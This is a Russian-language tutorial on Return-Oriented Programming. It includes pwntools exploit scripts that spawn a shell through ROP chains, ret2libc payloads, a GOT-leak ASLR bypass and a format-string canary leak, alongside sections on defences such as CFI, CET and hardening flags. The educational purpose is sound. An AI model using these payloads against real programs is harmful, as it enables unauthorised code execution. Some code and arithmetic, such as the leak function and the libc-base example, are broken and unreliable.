# Return-Oriented Programming (ROP)

## Введение

После появления неисполняемых страниц памяти (DEP/NX) в начале 2000-х казалось, что эра шеллкода в стеке уходит в прошлое. Атакующий мог переполнить буфер и перезаписать адрес возврата, но куда прыгнуть? Выполнить код в стеке или куче уже нельзя.

В 2007 году Хоавав Шакхам (Hovav Shacham) опубликовал статью «The Geometry of Innocent Flesh on the Bone», в которой систематически описал технику **Return-Oriented Programming (ROP)**. Идея оказалась революционной: не нужно вводить новый код — можно использовать **фрагменты существующего кода** программы. Каждый такой фрагмент заканчивается инструкцией `ret`, и, управляя стеком, атакующий создаёт цепочку выполнений произвольных операций.

ROP стал основой большинства реальных эксплойтов против современных систем и по сей день активно используется.

---

## 1. Предпосылки: что такое гаджет

### Инструкция RET в x86-64

`ret` эквивалентна `pop rip` — она берёт адрес с вершины стека и передаёт управление на него. Именно это свойство используется в ROP.

```
Легитимное выполнение:
  func:                   |  Стек при входе в func:
    push rbp              |  +-----------------+
    mov rbp, rsp          |  |  ret addr (к main) |
    sub rsp, 64           |  +-----------------+
    ...                   |
    leave                 |
    ret  ←────────────────|── pop rip → возврат в main
```

**ROP-гаджет** — последовательность от 1 до ~5 машинных инструкций, заканчивающаяся `ret`:

```asm
; Пример гаджетов (x86-64)

; Гаджет 1: pop rdi; ret
; Загрузить значение со стека в rdi (первый аргумент функции)
48 5f c3

; Гаджет 2: pop rsi; ret
; Второй аргумент
5e c3

; Гаджет 3: pop rdx; ret  
; Третий аргумент
5a c3

; Гаджет 4: mov [rdi], rsi; ret
; Запись rsi по адресу rdi
48 89 37 c3

; Гаджет 5: syscall; ret
; Системный вызов и возврат
0f 05 c3
```

Гаджеты ищутся в **коде самой программы** и загруженных библиотеках (libc, libm и т.д.). Код там точно исполняемый.

---

## 2. Механика ROP-цепочки

### Структура стека при ROP

```
+--------------------+  ← rsp после переполнения
|  addr_gadget_1     |  ← pop rdi; ret  →  rdi = arg1_value
+--------------------+
|  arg1_value        |  ← значение для rdi
+--------------------+
|  addr_gadget_2     |  ← pop rsi; ret  →  rsi = arg2_value  
+--------------------+
|  arg2_value        |  ← значение для rsi
+--------------------+
|  addr_gadget_3     |  ← pop rdx; ret  →  rdx = arg3_value
+--------------------+
|  arg3_value        |
+--------------------+
|  addr_gadget_4     |  ← pop rax; ret  →  rax = syscall_number
+--------------------+
|  syscall_number    |  ← например 59 = execve
+--------------------+
|  addr_gadget_5     |  ← syscall; ret
+--------------------+
```

При первом `ret` (из уязвимой функции) rsp указывает на `addr_gadget_1`. Гаджет 1 выполняет `pop rdi` (загружает `arg1_value` в rdi, rsp+8), затем `ret` — управление переходит к гаджету 2. И так далее.

### Пример: вызов execve("/bin/sh", NULL, NULL) через ROP

```python
# ROP на Python с использованием pwntools
from pwn import *

# Загружаем бинарник для анализа
elf = ELF('./vulnerable_program')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Ищем гаджеты автоматически с помощью ROPgadget / pwntools
rop = ROP(libc)

# Адреса гаджетов (реальные найдены в libc)
pop_rdi    = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi    = rop.find_gadget(['pop rsi', 'ret']).address  
pop_rdx    = rop.find_gadget(['pop rdx', 'ret']).address
pop_rax    = rop.find_gadget(['pop rax', 'ret']).address
syscall    = rop.find_gadget(['syscall', 'ret']).address

# Адрес строки "/bin/sh" в libc
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Базовый адрес libc (нужен при ASLR — получают через утечку адреса)
libc_base = 0x00007ffff7c00000  # пример (реальный — из утечки)

# Сборка ROP-цепочки
def build_rop_chain(libc_base: int, bin_sh_offset: int) -> bytes:
    # execve("/bin/sh", NULL, NULL)
    # rdi = указатель на "/bin/sh"
    # rsi = NULL
    # rdx = NULL
    # rax = 59 (SYS_execve)
    
    chain = b''
    chain += p64(libc_base + pop_rdi)
    chain += p64(libc_base + bin_sh_offset)   # rdi = "/bin/sh"
    chain += p64(libc_base + pop_rsi)
    chain += p64(0)                            # rsi = NULL
    chain += p64(libc_base + pop_rdx)
    chain += p64(0)                            # rdx = NULL
    chain += p64(libc_base + pop_rax)
    chain += p64(59)                           # rax = execve
    chain += p64(libc_base + syscall)          # syscall
    
    return chain

# Полный payload
offset = 72  # смещение от начала буфера до адреса возврата
rop_chain = build_rop_chain(libc_base, bin_sh - libc_base)
payload = b'A' * offset + rop_chain

# Отправить в уязвимую программу
# p = process('./vulnerable_program')
# p.sendline(payload)
# p.interactive()
```

---

## 3. Поиск гаджетов

### ROPgadget — автоматический поиск

```bash
# Установка
pip install ROPgadget

# Поиск всех гаджетов в бинарнике
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | head -50

# Поиск конкретного гаджета
ROPgadget --binary ./program --only "pop|ret" | grep "pop rdi"
# → 0x000000000002a3e5 : pop rdi ; ret

# Поиск цепочек для системного вызова
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop

# Поиск гаджетов с ограничениями (без байта 0x0a = newline)
ROPgadget --binary ./program --badbytes "0a0d"
```

```python
# Программный поиск гаджетов
def find_gadgets_in_binary(binary_data: bytes, 
                            gadget_pattern: list[bytes]) -> list[int]:
    """
    Упрощённый поиск ROP-гаджетов.
    gadget_pattern: список байтовых строк инструкций, заканчивающихся \xc3 (ret)
    """
    gadgets = []
    ret_byte = 0xc3
    
    # Ищем все ret инструкции
    offset = 0
    while True:
        pos = binary_data.find(bytes([ret_byte]), offset)
        if pos == -1:
            break
        
        # Смотрим назад на 1-10 байт
        for lookback in range(1, 11):
            start = pos - lookback
            if start < 0:
                continue
            
            candidate = binary_data[start:pos+1]
            # Здесь нужен дизассемблер (capstone) для проверки валидности
            # Упрощённо: просто находим все ret
            gadgets.append(start)
        
        offset = pos + 1
    
    return gadgets

# На практике используют capstone для дизассемблирования:
import capstone

def find_rop_gadgets(binary: bytes, arch=capstone.CS_ARCH_X86, 
                     mode=capstone.CS_MODE_64) -> list[dict]:
    """Найти все ROP-гаджеты (цепочки, заканчивающиеся ret)"""
    md = capstone.Cs(arch, mode)
    md.detail = True
    gadgets = []
    
    # Ищем байт ret (0xc3) и дизассемблируем назад
    i = 0
    while i < len(binary):
        if binary[i] == 0xc3:  # ret
            # Смотрим назад до 5 инструкций
            for lookback in range(1, 16):
                start = max(0, i - lookback)
                chunk = binary[start:i+1]
                
                insns = list(md.disasm(chunk, start))
                if insns and insns[-1].mnemonic == 'ret':
                    gadget_str = ' ; '.join(
                        f"{ins.mnemonic} {ins.op_str}".strip() 
                        for ins in insns
                    )
                    gadgets.append({
                        'offset': start,
                        'bytes': chunk.hex(),
                        'gadget': gadget_str,
                        'len': len(insns)
                    })
        i += 1
    
    # Убираем дубликаты
    seen = set()
    unique = []
    for g in gadgets:
        if g['gadget'] not in seen:
            seen.add(g['gadget'])
            unique.append(g)
    
    return unique
```

---

## 4. ret2libc — классическая ROP-атака

До появления полноценного ROP существовала техника **ret2libc**: перезаписать адрес возврата адресом функции `system()` в libc, а аргумент (строку `"/bin/sh"`) положить на стек.

```
Стек после переполнения (x86, 32-bit):
+--------------------+
|  addr of system()  |  ← новый ret addr
+--------------------+
|  addr of exit()    |  ← "ret addr" внутри system (чтобы выйти чисто)
+--------------------+
|  addr of "/bin/sh" |  ← аргумент для system()
+--------------------+
```

```python
# ret2libc для 32-bit (x86)
from pwn import *

# В 64-bit нужен ROP для загрузки аргументов через регистры
def build_ret2libc_32(system_addr: int, exit_addr: int, 
                       binsh_addr: int, offset: int) -> bytes:
    """Строим payload для ret2libc (x86, 32-bit)"""
    payload = b'A' * offset          # заполнение буфера
    payload += p32(system_addr)      # адрес system()
    payload += p32(exit_addr)        # адрес для возврата из system()
    payload += p32(binsh_addr)       # аргумент: "/bin/sh"
    return payload

# Для 64-bit нужен гаджет для загрузки rdi:
def build_ret2libc_64(pop_rdi: int, binsh_addr: int, 
                       system_addr: int, offset: int) -> bytes:
    """Строим payload для ret2libc (x86-64)"""
    payload = b'A' * offset
    payload += p64(pop_rdi)          # pop rdi; ret
    payload += p64(binsh_addr)       # rdi = "/bin/sh"
    payload += p64(system_addr)      # вызов system("/bin/sh")
    return payload
```

---

## 5. Обход ASLR: утечки адресов

**ASLR** (Address Space Layout Randomization) рандомизирует базовые адреса библиотек при каждом запуске. Это главная защита против ROP. Но её можно обойти через **утечку адресов** (information leak):

```c
// Уязвимость: формат-строка для утечки адресов стека/libc
// (подробнее в следующей статье)
printf(user_input);  // Если user_input = "%p %p %p %p"
// Выведет адреса со стека: 0x7ffff7a12345 0x... — это адрес в libc!

// Зная одни адрес в libc, вычисляем базу:
// libc_base = leaked_addr - known_offset_in_libc
```

```python
# Вычисление libc base из утечки
def compute_libc_base(leaked_addr: int, symbol_name: str, 
                       libc: 'ELF') -> int:
    """
    leaked_addr — утечённый адрес символа в libc
    symbol_name — имя символа (например, 'puts' или '__libc_start_main')
    """
    symbol_offset = libc.symbols[symbol_name]
    libc_base = leaked_addr - symbol_offset
    
    # Проверка выравнивания (libc всегда выровнена по странице 0x1000)
    assert libc_base & 0xFFF == 0, f"Неверное выравнивание: {libc_base:#x}"
    
    return libc_base

# Пример: получили утечку адреса puts@got = 0x7ffff7a2d4a0
# В libc: puts находится на смещении 0x84a30
# libc_base = 0x7ffff7a2d4a0 - 0x84a30 = 0x7ffff79a9070

# Теперь:
# system() = libc_base + libc.symbols['system']
# "/bin/sh" = libc_base + next(libc.search(b'/bin/sh'))
```

### Техника GOT overwrite / ret2plt

```python
# ret2plt: вызываем функцию через PLT для утечки адреса из GOT
#
# PLT (Procedure Linkage Table) — таблица вызовов внешних функций
# GOT (Global Offset Table) — таблица реальных адресов функций
#
# Идея:
# 1. Вызвать puts(got['puts']) — выводит реальный адрес puts из GOT
# 2. Из него вычислить libc_base
# 3. Вычислить адреса system() и "/bin/sh"
# 4. Вернуться в main() и эксплуатировать снова с известными адресами

def leak_and_exploit(elf, libc, offset: int):
    """Двухстадийная атака: утечка → эксплойт"""
    
    # Стадия 1: утечка адреса puts
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret_gadget = rop.find_gadget(['ret']).address  # выравнивание стека
    
    # Payload для утечки: puts(got['puts'])
    leak_payload = flat([
        b'A' * offset,
        p64(elf.plt['puts']),        # вызов через PLT
        # Нет, нам нужен ROP:
        p64(pop_rdi),                # pop rdi; ret
        p64(elf.got['puts']),        # rdi = адрес в GOT
        p64(elf.plt['puts']),        # вызов puts
        p64(elf.symbols['main'])     # возврат в main для второй стадии
    ])
    
    return leak_payload
```

---

## 6. Сигнатуры защиты и их обходы

### Stack Canary (канарейки)

Стек-канарейки — случайное значение, помещаемое между локальными переменными и адресом возврата. Перед `ret` проверяется целостность.

```c
// С -fstack-protector-strong компилятор генерирует примерно:
void protected_function(char *input) {
    unsigned long canary = __stack_chk_guard;  // глобальная "канарейка"
    char buffer[64];
    
    strcpy(buffer, input);  // потенциальное переполнение
    
    // Перед возвратом:
    if (__stack_chk_guard != canary) {
        __stack_chk_fail();  // abort() — программа завершается
    }
    // Только теперь ret
}
```

```
Стек с канарейкой:
+------------------+
|  адрес возврата  |
+------------------+
|  сохранённый rbp |
+------------------+
|    CANARY        |  ← случайное значение, проверяется перед ret
+------------------+
|    buffer[64]    |
+------------------+
```

**Обходы канарейки:**
1. **Утечка канарейки** через format string уязвимость
2. **Частичное перезаписание** (только нижние байты, если канарейка содержит нулевой байт)
3. **Brute force** (только в 32-bit: 256 возможных значений последнего байта)

```python
# Обход через утечку канарейки (концептуально)
def leak_canary_via_format_string(target):
    """
    Используем format string для чтения канарейки со стека
    Канарейка обычно на %n-м позиции от начала стека
    """
    # Отправляем format string для чтения стека
    for i in range(1, 50):
        target.sendline(f'%{i}$p'.encode())
        val = int(target.recvline().strip(), 16)
        
        # Канарейка всегда начинается с нулевого байта (0x..........00)
        if (val & 0xFF) == 0 and val != 0:
            print(f"[+] Canary found at position {i}: {val:#x}")
            return val
    
    return None
```

---

## 7. RELRO — защита GOT

**RELRO** (Relocation Read-Only) — защита, делающая GOT только для чтения после загрузки:

```bash
# Проверить уровень RELRO в бинарнике
checksec --file=./program
# Full RELRO:    GOT read-only, все символы разрешены при загрузке
# Partial RELRO: только non-lazy binding, часть GOT writable

# В Makefile:
# Partial RELRO: -Wl,-z,relro
# Full RELRO:    -Wl,-z,relro,-z,now
```

При **Full RELRO** атака GOT overwrite невозможна. При **Partial RELRO** — возможна перезапись .got.plt для перенаправления вызовов.

---

## 8. JOP и COP — вариации ROP

**Jump-Oriented Programming (JOP)** использует гаджеты, заканчивающиеся `jmp [reg]` вместо `ret`. Подходит для обхода защит, проверяющих стек.

**Call-Oriented Programming (COP)** использует `call [reg]`. Сложнее строить, но обходит некоторые защиты shadow stack.

```asm
; JOP-диспетчер (dispatcher gadget):
; jmp [rax+8*rbx]  ; прыгаем по таблице
; 
; JOP-таблица (в памяти):
; +------------------+
; |  addr_gadget_1   |  ← [rax + 0]
; +------------------+
; |  addr_gadget_2   |  ← [rax + 8]
; +------------------+
; Управление потоком через регистры, а не стек
```

---

## 9. Автоматизация с pwntools

```python
# Полный пример ROP эксплойта с pwntools
from pwn import *

def exploit():
    # context: архитектура и ОС
    context.arch = 'amd64'
    context.os = 'linux'
    context.log_level = 'info'
    
    # Загружаем цель
    elf = ELF('./vuln_program', checksec=False)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    
    # --- Стадия 1: Утечка адреса libc ---
    p = process('./vuln_program')
    
    # Автоматический поиск гаджетов
    rop = ROP(elf)
    
    offset = 72  # смещение до ret addr (найдено через cyclic pattern)
    
    # payload для утечки: puts(got['puts']) → возврат в main
    payload1 = flat({
        offset: [
            rop.find_gadget(['pop rdi', 'ret']).address,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
        ]
    })
    
    p.sendlineafter(b'Input: ', payload1)
    
    # Получаем утечку
    leaked_puts = u64(p.recvline()[:8].ljust(8, b'\x00'))
    log.info(f"Leaked puts @ {leaked_puts:#x}")
    
    # Вычисляем базу libc
    libc.address = leaked_puts - libc.symbols['puts']
    log.info(f"libc base @ {libc.address:#x}")
    
    # --- Стадия 2: Эксплойт с известными адресами ---
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.symbols['system']
    
    # ret gadget для выравнивания стека (требуется в некоторых libc)
    ret_gadget = rop.find_gadget(['ret']).address
    
    payload2 = flat({
        offset: [
            ret_gadget,            # выравнивание стека (16 байт)
            rop.find_gadget(['pop rdi', 'ret']).address,
            bin_sh,                # rdi = "/bin/sh"
            system                 # system("/bin/sh")
        ]
    })
    
    p.sendlineafter(b'Input: ', payload2)
    p.interactive()  # Получаем shell!

if __name__ == '__main__':
    exploit()
```

---

## 10. Защита Control Flow Integrity (CFI)

**CFI** — современная защита от ROP, ограничивающая цели непрямых переходов только легитимными адресами.

```c
// Clang CFI: компилятор вставляет проверки перед каждым indirect call/jmp
// Компиляция: clang -fsanitize=cfi -flto -fvisibility=hidden

// Без CFI:
typedef void (*func_t)(void);
func_t fn = get_function_pointer();
fn();  // fn может быть любым адресом

// С CFI Clang компилирует примерно в:
typedef void (*func_t)(void);
func_t fn = get_function_pointer();
// Clang вставляет:
if (!__cfi_check(fn, type_id_of_func_t)) {
    __cfi_fail();  // abort
}
fn();  // только если прошла проверка типа
```

### Microsoft Control Flow Guard (CFG)

```c
// Windows: /guard:cf флаг компилятора
// При вызове через указатель добавляется проверка:
// is fn in the CFG bitmap? (bitmap действительных indirect call targets)

// Обход: атакующий должен вызвать только легитимные функции
// → ROP становится намного сложнее, но не невозможным
```

### Intel CET (Control-flow Enforcement Technology)

```asm
; CET: аппаратная защита (доступна с Ice Lake 2019)
; Shadow Stack: копия стека только с адресами возврата
; ENDBR64: инструкция-маркер начала функции

; Каждая функция начинается с:
endbr64    ; ENDBR64 = "End Branch 64-bit" = F3 0F 1E FA

; Каждый indirect jump/call должен вести на ENDBR64
; Иначе: #CP (Control Protection fault)

; RET проверяет: адрес в shadow stack == адрес в обычном стеке
; Shadow stack недоступен для записи обычным кодом
```

```bash
# Проверить поддержку CET в ядре
cat /proc/cpuinfo | grep shstk  # Shadow stack
cat /proc/cpuinfo | grep ibt    # Indirect Branch Tracking

# Компиляция с поддержкой CET (GCC 8+)
gcc -mcet -mshstk -mibt -o program program.c
```

---

## 11. Анализ реальных эксплойтов

### CVE-2021-3156 — sudo Baron Samedit

В январе 2021 была обнаружена уязвимость heap overflow в sudo, позволявшая любому локальному пользователю получить root. Эксплойт использовал ROP:

```
1. Heap overflow перезаписывает указатель функции в структуре
2. ROP-цепочка вызывает setuid(0) через системный вызов
3. Затем execve("/bin/sh", ...)
4. Результат: shell с правами root
```

### Log4Shell (CVE-2021-44228)

Log4Shell был RCE через JNDI injection — другой класс, но принцип тот же: перенаправление потока управления.

### CVE-2022-0847 Dirty Pipe

Использует другой механизм (splice + pipe), но принципы контроля потока исполнения те же.

---

## 12. Практические рекомендации

```bash
# Проверка защит бинарника
checksec --file=./program
# Вывод:
# RELRO:    Full RELRO
# STACK CANARY: Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RPATH:    No RPATH
# RUNPATH:  No RUNPATH
```

```c
// Рекомендуемые флаги компиляции для C/C++:
// -fstack-protector-strong     : канарейки на стеке
// -D_FORTIFY_SOURCE=2          : проверки strlen/memcpy/sprintf
// -pie -fPIE                   : позиционно-независимый код (для PIE)
// -Wl,-z,relro,-z,now          : Full RELRO
// -Wl,-z,noexecstack           : NX стек
// -fcf-protection=full         : Intel CET (если поддерживается)
// -fstack-clash-protection     : защита от stack clash
// -mbranch-protection=standard : PAC/BTI на ARM64

// Makefile пример:
CFLAGS = -Wall -Wextra -O2 \
         -fstack-protector-strong \
         -D_FORTIFY_SOURCE=2 \
         -fPIE \
         -fcf-protection=full \
         -fstack-clash-protection

LDFLAGS = -pie \
          -Wl,-z,relro \
          -Wl,-z,now \
          -Wl,-z,noexecstack
```

### Таблица мер защиты против ROP

| Защита | Что предотвращает | Ограничения |
|--------|------------------|-------------|
| NX/DEP | Исполнение shellcode в стеке/куче | ROP не использует исполн. стек |
| ASLR | Предсказание адресов | Обход через утечку адресов |
| Stack Canary | Перезапись ret addr через linear overflow | Обход через утечку канарейки |
| PIE | Предсказание адресов программы | Нужна утечка адреса программы |
| Full RELRO | GOT overwrite | Остаётся возможность ROP |
| CFI (software) | Ограничение целей indirect jmp | Overhead 5-10%, обходимо |
| CET (hardware) | ROP и JOP аппаратно | Только новые CPU, нужна поддержка ОС |
| Shadow Stack | Перезапись адресов возврата | Только новые CPU |

---

## Заключение

Return-Oriented Programming — мощная техника, позволяющая выполнить произвольный код, используя фрагменты существующих легитимных инструкций. Против неё разработан целый комплекс мер: программных (CFI, канарейки, ASLR+PIE) и аппаратных (Intel CET/Shadow Stack, ARM Pointer Authentication).

Понимание ROP необходимо:

1. **Разработчикам на C/C++** — знать, почему компилировать нужно со всеми флагами защиты
2. **Security engineer** — оценивать реальный риск уязвимостей overflow
3. **Исследователям безопасности** — проводить пентесты и разрабатывать эксплойты
4. **Архитекторам** — принимать решения о переходе на memory-safe языки (Rust) для компонентов с высоким риском

Наилучшая защита — **memory-safe языки** (Rust, Go, Java): в них переполнение буфера просто невозможно.

---

## Литература и источники

1. Shacham, H. (2007). *The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)*. CCS 2007. https://hovav.net/ucsd/dist/geometry.pdf
2. Checkoway, S., et al. (2010). *Return-Oriented Programming without Returns*. CCS 2010. https://hovav.net/ucsd/dist/noret-ccs.pdf
3. Roemer, R., et al. (2012). *Return-Oriented Programming: Systems, Languages, and Applications*. ACM TISSEC. https://doi.org/10.1145/2133375.2133377
4. ROPgadget tool. https://github.com/JonathanSalwan/ROPgadget
5. pwntools documentation. https://docs.pwntools.com/
6. Intel. *Control-flow Enforcement Technology Specification*. https://www.intel.com/content/dam/www/public/us/en/documents/technical-reports/intel-cet-tech-report.pdf
7. Clang CFI documentation. https://clang.llvm.org/docs/ControlFlowIntegrity.html
8. GCC Stack Smashing Protector. https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
9. CVE-2021-3156 (Baron Samedit). https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
10. checksec tool. https://github.com/slimm609/checksec.sh
